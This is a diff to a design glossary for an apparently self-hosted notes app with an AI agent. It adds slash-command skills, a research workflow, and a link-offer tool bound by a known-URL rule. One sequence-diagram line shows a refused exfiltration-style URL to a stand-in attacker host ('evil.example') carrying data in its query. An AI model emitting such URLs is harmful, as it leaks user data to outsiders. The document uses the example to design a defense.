@@ -1,7 +1,7 @@
 ---
 title: "Domain: karpathy.app"
 created: 2026-10-01
-edited: 2026-10-05
+edited: 2026-10-06
 ---
 
 # Domain: karpathy.app
@@ -64,7 +64,7 @@ same GitHub remote. The motivation is in the [README](../../README.md#problem).
 | **Chat** | A resumable conversation with the AI, bound to exactly one vault; its reach is that vault's root. *Avoid:* session, thread, conversation. | one opencode session |
 | **Turn** | One user prompt in a chat plus everything the AI reads and changes in response. States `idle`, `queued` (waiting for another turn or for the sync), `running`. | `TurnState` |
 | **Consulted file / changed file / opened note** | The three tool-chip kinds of a turn: files the AI read (read tools), wrote (edit/write/patch tools), or asked the app to show (`open_note`). An opened note is neither consulted nor changed: opening reads and writes nothing. | `ToolCall.writes`, `ToolCall.opens` |
-| **Open request** | One call of the AI's `open_note` tool. It succeeds only for a file the file tree lists inside the chat's vault root; otherwise it fails as a tool error the AI sees, and nothing opens. | `open_note` tool |
+| **Open request** | One call of the AI's `open_note` tool. It succeeds only for a file the file tree lists inside the chat's vault root; otherwise it fails as a tool error the AI sees, and nothing opens. Only `open_note`: a link offer is not an open request, because it never opens anything by itself. | `open_note` tool |
 | **Live event vs. history** | Live events arrive on the chat stream while a turn runs; history is the stored chat loaded on reload or when a chat is opened. Only a live open request moves the UI; history shows the chip and moves nothing. | `ChatEvent` vs. `api.chat` |
 | **AI-touched** | The set of paths the AI changed since the last commit. A commit that includes one of them gets the `Co-authored-by: karpathy.app agent` trailer. | `config.aiTouched` |
 | **Uncommitted change** | A file that differs from its last commit, whether the user or the AI changed it; both are pooled. *Avoid:* draft, pending edit, dirty file. | `Change` |
@@ -89,12 +89,30 @@ same GitHub remote. The motivation is in the [README](../../README.md#problem).
 | **Place** | Where the user left a note: scroll position and mode. Back to a note seen in this session restores it; switching Write ↔ Read keeps the same source line. In memory only. | store `places`; web `lib/place.ts` |
 | **Web access** | The global setting, on by default. On: the AI may web search and web fetch in every vault. Off: it has neither tool. | `Settings.webAccess` |
 | **Web search / web fetch** | One call of `websearch` (a query to the search backend, results with titles, URLs and page text) or `webfetch` (one URL downloaded as Markdown, text or an image). Never just "search" (that's the user's vault search) or "fetch". | `ToolCall.query`, `ToolCall.url` |
-| **Known URL** | A URL that appears verbatim in the chat as the model saw it: user messages and earlier tool outputs (notes read, results, fetched pages; a truncated output counts as its preview). Only known URLs may be fetched; scheme/host case, default port and fragment don't matter, path and query must match. | `deploy/opencode/lib/known-url.ts` |
+| **Known URL** | A URL that appears verbatim in the chat as the model saw it: user messages and earlier tool outputs (notes read, results, fetched pages; a truncated output counts as its preview). Only known URLs may be fetched or offered as a link; scheme/host case, default port and fragment don't matter, path and query must match. The hidden instructions of a command turn count as user text, so a URL written in a skill is known. | `deploy/opencode/lib/known-url.ts` |
 | **Web caps** | At most N web fetches and N web searches per turn, counted separately (default 20 each, per target). | `WEB_FETCH_CAP`, `WEB_SEARCH_CAP` |
 | **Web content** | Search results and fetched pages: untrusted input, like an ingested note. Lives only in the chat; reaches the vault only if the AI writes about it. | tool output |
 | **Search backend** | Exa, the one recipient of web search queries; fixed by the release (opencode image env). | `OPENCODE_WEBSEARCH_PROVIDER=exa` |
 | **Egress proxy** | The only path from the AI's container to the internet; refuses internal addresses. | compose service `egress` |
 | **Web chips** | `searched the web: "<query>"` (label) and `fetched <url>` (link to the page); the fourth and fifth chip kinds next to consulted, changed and opened. | web `toolLabel` |
+| **Link offer** | One call of the AI's `open_url` tool: it offers a web page to the user and fetches nothing. It succeeds only for a known http(s) URL (else a tool error the AI sees, no chip), needs no Web access (the user's browser loads the page, not the server), counts against no cap, and opens nothing until the user taps. The AI makes one only when the user asks to see a page. | `open_url` tool, `ToolCall.url` |
+| **Open chip** | `open <host/path>`: the chip of a completed link offer, a link that opens the page in a new tab (the user's own browser, cookies and network; the egress proxy isn't involved). The sixth chip kind. | `ToolCall` with `tool: 'open_url'`, `toolHref` |
+| **Command** | A skill the chat can start by name with `/name`: a vault skill or an app skill. The UI says "command"; the code says `skill` only where it means opencode's skill. opencode's built-ins `init`, `review` and `customize-opencode` are never commands. | `Command { name, description, source, replaces? }` |
+| **Vault skill** | A skill in the vault's skill folder `.agents/skills/<name>/SKILL.md`: written by the vault author, synced by git, only in that vault, also seen by Claude Code on the Mac. Examples: `query`, `lint`, `ingest`. Palette group "This vault", tag `vault`. | `Command.source = 'vault'` |
+| **App skill** | A skill that ships in the opencode image, so every vault has it; changes only with an app release; Claude Code on the Mac doesn't see it. Today only `research`. Palette group "karpathy.app", tag `app`. | `Command.source = 'app'` |
+| **Replacing vault skill** | A vault skill with the same name as an app skill. The vault skill wins (the backend decides; opencode's own pick isn't stable); the app skill doesn't run as a command in that vault, and the palette says so. | `Command.replaces = true` |
+| **Skill folder** | `.agents/skills/` in the vault root: the only place a vault's skills are read from, by the palette and by the AI. Shared with other harnesses (Codex, Cursor, Gemini CLI). | `OPENCODE_DISABLE_CLAUDE_CODE_SKILLS=1` |
+| **`.agents` standard** | The open, cross-harness layout a vault follows in this app: instructions in `AGENTS.md`, skills in the skill folder. Anthropic's `CLAUDE.md` / `.claude/` remain only as pointers for Claude Code on the Mac. | |
+| **Agents move** | What the app does by itself after every clone, pull and open of a vault that isn't in the `.agents` standard yet: moves `.claude/skills/*` into the skill folder, turns `.claude/commands/*.md` into skills, turns `CLAUDE.md` into `AGENTS.md` with its `@` imports pasted in, rewrites `CLAUDE.md` to `@AGENTS.md` (or writes it when only `AGENTS.md` exists) and leaves the **skill link** `.claude/skills → ../.agents/skills`. Never overwrites (clashes stay and are listed), skipped in conflict, commits nothing. Its result is uncommitted changes, announced by a notice and reviewed like any edit. | `agents-standard.ts`, event `agents-move` |
+| **Skill link** | The git symlink `.claude/skills → ../.agents/skills`. On the server (`core.symlinks=false`) it is a plain stub file staged with mode 120000; the Mac checks it out as a real link. | `Repo.stageSymlink` |
+| **Command list** | The commands of one vault. Differs per vault; refreshed after a pull or edit changed a skill file. | `GET /vaults/:id/commands` |
+| **Command palette** | The popover over the composer while the text is `/` plus a partial name. Filters the command list; picking an entry fills in `/name `. | `ChatPane`, `lib/commands.ts` |
+| **Command chip** | One of up to four buttons in an empty chat. A tap puts `/name ` in front of the composer's text (empty or a draft) and focuses it; it sends nothing. Order: last used in this browser and vault first (localStorage), then A–Z. | `lib/commands.ts` |
+| **Command turn** | A turn whose text starts with `/name` where `name` is in the vault's command list. The user's text is what the chat shows; the skill's instructions go to the AI as a hidden part of the same message. Any other text (an unknown `/word`) is a plain turn. | `chat.ts`, `harness/command.ts` |
+| **Research run** | The work started by `/research <topic>`: a plan turn, then one or more run turns. `/research <plan note or its topic>` resumes a run in any chat, skipping the plan. | `research` skill |
+| **Plan note** | The research plan: 3–6 sub-questions as a checklist in `Research/<YYYY-MM-DD>-<slug>.md` (folder per the vault's rules). The user may edit it before confirming; run turns tick off answered questions and link the answering pages, so a run can resume later. It stays after the run as its record. In conflict (read-only) the plan goes into the reply instead. | `research` skill |
+| **Plan turn / run turn** | Plan turn: the first turn of a research run; reads the wiki, scouts the web a little (≤ 3 searches, ≤ 2 fetches), writes the plan note and stops for the user's "go". Run turn: any later turn; reads the plan note, searches, fetches, saves source files (≤ 8 per turn), writes cited pages, ticks off the note, and ends by asking to continue when questions remain. The scouting budget and the stop are skill instructions, not a backend rule; the hard bound is the web caps. | `research` skill |
+| **Source file** | A file in `Sources/` that a research run saved for one web page: frontmatter `url`, `title`, `fetched`, then a summary with short quotes, never the full page (the vault's own rules may change folder, name and frontmatter only). A URL already in `Sources/` isn't saved again. Wiki pages cite it in `sources:` and with `[[Sources/…]]`. | `research` skill |
 | **Harness config** | An `.opencode/`, `opencode.json` or `opencode.jsonc` inside a vault. Its presence disables chat for that vault, because it could override the AI's restrictions. | `HARNESS_CONFIG` |
 
 ### Operations
@@ -144,6 +162,11 @@ erDiagram
   VAULT_ROOT ||--|| SOURCES : "requires"
   VAULT_ROOT ||--|| WIKI : "requires"
   VAULT_ROOT ||--o| SCHEMA : "may have"
+  VAULT ||--o{ VAULT_SKILL : "has, in .agents/skills"
+  VAULT_SKILL }o--o| APP_SKILL : "replaces (same name)"
+  VAULT_SKILL ||--o{ COMMAND : "is listed as"
+  APP_SKILL ||--o{ COMMAND : "is listed as"
+  TURN }o--o| COMMAND : "may start with"
 ```
 
 - **Settings** are server-wide: the commit reminder threshold and the **model** (`provider/model`, default
@@ -193,7 +216,9 @@ more.
 |---|---|
 | **Operator** (the same person as the user, on the Mac) | Cuts releases, deploys them to the targets, holds the vault passwords (Keychain) and gets the alerts. |
 | **User** (single person, holds the bearer token) | Manage vaults and settings, read and edit notes, upload photos and PDFs (button or drop; the first upload to a flat page moves it into its own folder), attach them to prompts, search, chat with the AI, review diffs, discard, commit and push, resolve conflicts. Uses the app as a PWA on phone, iPad and desktop. |
-| **AI** (opencode agent, on the user's behalf) | Inside one vault root only: read notes; write notes unless the vault is in conflict (then read-only); open one note in the user's editor when the user asks to see it (also in conflict). Receives attached images and PDFs as message content when its model reads them. With Web access on: web search, and web fetch of known URLs (also in conflict). It can't run shell commands, fetch URLs it built itself, reach internal hosts, read `.env` files, edit `.git` or harness config, create binary files, commit or push. |
+| **AI** (opencode agent, on the user's behalf) | Inside one vault root only: read notes; write notes unless the vault is in conflict (then read-only); open one note in the user's editor when the user asks to see it (also in conflict). Receives attached images and PDFs as message content when its model reads them. With Web access on: web search, and web fetch of known URLs (also in conflict). Follows a command's instructions; in a research plan turn it scouts only a little and stops for the user's reply. Offers a known URL to the user as an Open chip when asked to show a page (also with Web access off and in conflict). It can't run shell commands (a skill's shell snippets are never run), fetch or offer URLs it built itself, reach internal hosts, read `.env` files, edit `.git` or harness config, create binary files, commit or push. |
+| **Vault author** (whoever pushes to the repo) | Adds commands by adding skills to `.agents/skills/` (or to `.claude/`, which the agents move picks up on the next pull). A skill is instructions for the AI, not code. |
+| **User's browser** | Loads a page the user opened from an Open chip, with the user's own cookies and network. |
 | **Device (iOS)** | Converts HEIC photos to JPEG when the picker's accepted types are an explicit list without HEIC. |
 | **Search backend (Exa)** | Receives the AI's web search queries; returns results. |
 | **Public web** | Serves fetched pages; untrusted. |
@@ -338,6 +363,9 @@ No navigation changes the mode; only the Write/Read toggle does.
    call streams as a web chip. A fetch of an unknown URL fails as a tool error and the turn goes on.
 5. The lock is released when opencode reports the session idle. Changes stay uncommitted.
 
+A prompt that starts with the name of one of the vault's commands is a **command turn** ([below](#command-turn)); the
+`open_url` tool offers a page the same way `open_note` opens a note, but only on a tap ([Link offer](#link-offer)).
+
 ```mermaid
 sequenceDiagram
   actor U as User
@@ -354,6 +382,89 @@ sequenceDiagram
   W->>W: wide: openNote(path) now
   Note over W: phone / tablet overlay: waits until the turn ends, then opens
 ```
+
+### Command turn
+
+```mermaid
+sequenceDiagram
+  actor U as User
+  participant App
+  participant AI
+  U->>App: types "/" → palette lists the vault's commands
+  U->>App: picks "query", types "what is RAG?", sends
+  App->>App: queue, pull (refresh the command list if a skill changed)
+  App->>AI: "/query what is RAG?" + hidden: query skill instructions
+  AI-->>App: reads Wiki pages (chips), answers
+  App-->>U: bubble "/query what is RAG?", reply with citations
+```
+
+The text must start with `/name` and `name` must be in the vault's command list; `$1`…`$N` and `$ARGUMENTS` in the
+skill take the words after the name. The skill's text is sent as written: shell snippets (`` !`…` ``) and `@file`
+references in it stay plain text.
+
+### Research run
+
+```mermaid
+stateDiagram-v2
+  [*] --> Plan: /research topic
+  Plan: Plan turn (≤ 3 searches, ≤ 2 fetches)
+  Plan --> Waiting: AI writes plan note, 3–6 sub-questions
+  Waiting --> Run: user edits the note (optional), replies "go"
+  Waiting --> [*]: user does something else
+  Run: Run turn (≤ 20 searches, ≤ 20 fetches, ≤ 8 sources)
+  Run --> Done: all questions answered
+  Run --> Paused: caps or source limit reached
+  Paused --> Run: user replies "continue"
+  Paused --> [*]: user stops
+  Done --> [*]: Research/ + Sources/ + Wiki/ changes, uncommitted
+```
+
+`/research <plan note or its topic>` skips the plan and resumes in any chat. The run leaves a plan note
+(`Research/…`, questions ticked, linking the answering pages), source files (`Sources/…`, with `url`) and wiki pages
+citing them, all uncommitted for the user's review. The app never asks for approval inside a turn: the user's next
+message is the confirmation.
+
+### Agents move
+
+```mermaid
+flowchart LR
+  T["clone, pull or open"] --> D{"CLAUDE.md, .claude/skills/*<br/>or .claude/commands/*.md?"}
+  D -- yes --> M["CLAUDE.md → AGENTS.md (imports pasted in),<br/>CLAUDE.md = @AGENTS.md,<br/>skill folders moved, foo.md → foo/SKILL.md,<br/>.claude/skills = link to ../.agents/skills"]
+  M --> NT["notice: Moved to the .agents standard · Review"]
+  NT --> C["uncommitted changes → review → commit"]
+  C --> MAC["Mac: Claude Code reads @AGENTS.md, follows the link"]
+  M --> P["palette lists the skills"]
+  D -- no --> N[nothing]
+```
+
+A name present in both places is not moved; the notice lists it. `.claude/commands/` is removed only when every file in
+it was moved. Files pasted into `AGENTS.md` stay where they are; the notice offers deleting them. A gitignored file is
+never pasted (`AGENTS.md` gets committed). Discarding the changes undoes the move until the next pull.
+
+### Link offer
+
+```mermaid
+sequenceDiagram
+  actor U as User
+  participant App
+  participant AI
+  U->>App: "open the video linked in my reading list"
+  App->>AI: turn
+  AI->>AI: read Lists/Reading.md (URL becomes known)
+  AI->>App: open_url("https://youtube.com/watch?v=…") → known → offered
+  App-->>U: Open chip "open youtube.com/watch?v=…"
+  U->>App: taps the chip
+  App->>U: new browser tab with the page
+  Note over AI,App: open_url("https://evil.example/?d=…") → "URL not in this chat", no chip
+```
+
+| | Fetched chip (`webfetch`) | Open chip (`open_url`) |
+|---|---|---|
+| What happens | The server downloads the page into the chat (up to 5 MB) | Nothing is downloaded; the user's browser opens the page on tap |
+| Needs Web access | yes | no |
+| Counts against the fetch cap | yes | no |
+| Pages behind a login, videos, apps | fail or come back empty | open with the user's own browser session |
+| URL rule | known URL | known URL |
 
 ### Commit
 
@@ -491,4 +602,20 @@ turn. A success toasts "Pulled N changes from GitHub"; changed files reload thro
 - **Web access off means invisible:** the model sees neither web tool. The commit-message agent never has them.
 - **Only known URLs are fetched;** web content never counts as instructions from the user (a rule for us, not a
   promise about the model; the commit review stays the safety net).
+- **Vault skill beats app skill, visibly.** On a name clash the vault skill runs; the palette says it replaces
+  karpathy.app's skill of that name. Vault and app skills are always marked as such in the UI.
+- **One skill folder.** A vault's commands come from `.agents/skills/` only (`.claude/skills/` and Claude Code plugin
+  skills are not read; a plugin skill must be copied into the vault). The app moves skills there automatically,
+  never over an existing name, and always as uncommitted changes the user reviews.
+- **A command is instructions, not code.** The app sends a skill's text to the AI as written; it never uses
+  opencode's command endpoint ([ADR 0004](../../docs/adr/0004-commands-as-prompts-not-command-endpoint.md)).
+- **A chip or the palette only fills the composer;** sending is the user's tap. A `/word` that is no command of the
+  vault is plain text.
+- **Research plans before the main run, by instruction.** The plan turn scouts at most 3 searches and 2 fetches,
+  writes the plan note and stops; the backend gives a `/research` turn the same tools as any turn, so this rests on the
+  model, and the hard bound is the web caps (20 searches, 20 fetches per turn). A run that needs more asks, and only
+  the user's reply starts the next turn.
+- **Sources keep their URL** and are summaries with short quotes, never full pages.
+- **Link offers follow the known-URL rule and need the user's tap.** The AI offers a page only when the user asked
+  to see one.
 - **Single user:** one bearer token, one git identity, one server-wide model.
